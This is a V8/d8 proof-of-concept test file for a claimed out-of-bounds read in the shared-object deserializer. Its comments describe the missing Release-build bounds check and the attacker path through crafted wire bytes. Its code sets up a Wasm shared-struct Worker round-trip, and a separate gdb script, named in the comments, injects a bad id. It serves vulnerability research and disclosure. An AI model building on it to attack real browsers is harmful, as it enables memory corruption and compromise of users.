// CVE candidate: ValueDeserializer::ReadSharedObject — OOB vector read
//
// Flags: --wasm-shared --allow-natives-syntax
//
// VULNERABILITY (src/handles/shared-object-conveyor-handles.h):
//   GetPersisted(uint32_t id) has only DCHECK(HasPersisted(id)) — stripped
//   in Release builds.  shared_objects_[id] then executes with no bounds check
//   at the V8 level.  std::vector::operator[] in a *non-hardened* Release build
//   likewise performs no check → OOB read of a Handle<HeapObject> pointer.
//
//   In this test binary (libc++ HARDENED MODE), operator[] adds an inline check
//   at ReadSharedObject+206 that fires SIGABRT on OOB.  In production Chrome
//   (non-hardened Release), that +206 check is absent → SIGSEGV / silent read.
//
// TRIGGER PATH:
//   WriteSharedObject() is called for Wasm {shared:true} structs/arrays.
//   Each unique shared object in a postMessage call gets an id stored in the
//   wire format as kSharedObject(0x70) + varint(id).
//   Sending N shared objects produces conveyor.size()=N (valid ids: 0..N-1).
//   An attacker controlling the wire bytes (e.g. compromised renderer) can
//   craft id=N to call GetPersisted(N) on a size-N conveyor → OOB read.
//
// THIS FILE: sets up the trigger path (Wasm shared struct Worker round-trip).
// value_serializer_oob.gdb: intercepts ReadSharedObject and injects OOB id.
//
// RUN:
//   gdb -batch -x value_serializer_oob.gdb /tmp/d8_build_mca/d8
//   (or: bash value_serializer_oob_run.sh)

d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");

// ── Wasm module: shared struct with one i32 field ────────────────────────────
let builder = new WasmModuleBuilder();
let structIdx = builder.addStruct({fields: [makeField(kWasmI32, true)], shared: true});
let maker_sig = makeSig([kWasmI32], [wasmRefType(structIdx)]);
let getter_sig = makeSig([wasmRefNullType(structIdx)], [kWasmI32]);

builder.addFunction("make", maker_sig)
  .addBody([kExprLocalGet, 0, kGCPrefix, kExprStructNew, structIdx])
  .exportFunc();
builder.addFunction("get", getter_sig)
  .addBody([kExprLocalGet, 0, kGCPrefix, kExprStructGet, structIdx, 0])
  .exportFunc();
let inst = builder.instantiate();

// ── Worker: receives shared struct, mutates it (proves shared identity), sends back ──
let w = new Worker(function() {
  onmessage = function({data: msg}) {
    d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");
    let b2 = new WasmModuleBuilder();
    let si = b2.addStruct({fields: [makeField(kWasmI32, true)], shared: true});
    let setter_sig = makeSig([wasmRefNullType(si), kWasmI32], []);
    b2.addFunction("set", setter_sig)
      .addBody([kExprLocalGet, 0, kExprLocalGet, 1, kGCPrefix, kExprStructSet, si, 0])
      .exportFunc();
    let i2 = b2.instantiate();
    // Mutation through Worker proves both sides reference the same in-shared-heap object
    i2.exports.set(msg.s, msg.v + 1000);
    postMessage({s: msg.s, done: true});
  };
}, {type: 'function'});

let s = inst.exports.make(42);
print("[+] shared struct created  value=" + inst.exports.get(s));
print("[+] postMessage({s}) → Worker");
print("    Wire: 0xFF <ver> 0x70='p'(kSharedObject) varint(id=0) …");
print("    Serializer path: WriteSharedObject() → Persist(s) → conveyor[0]=s");
w.postMessage({s: s, v: 42});

// ── Main thread receives: ReadSharedObject() is called with id=0 ─────────────
// GDB will intercept here and change id from 0 to 0xFFFF before the vector access.
let reply = w.getMessage();
print("[+] getMessage() returned");
print("    Deserialization path: ReadSharedObject() → GetPersisted(id)");
print("    If GDB changed id: 0 → 0xFFFF → crash at ReadSharedObject+220");
print("    If no GDB: id=0, conveyor[0] valid → no crash (expected)");
print("[+] Worker mutation visible: value=" + inst.exports.get(reply.s) + " (expected 1042)");
print("[+] Same object? " + (s === reply.s));
print("[DONE] Round-trip complete — GDB crash expected before this if OOB id was injected");
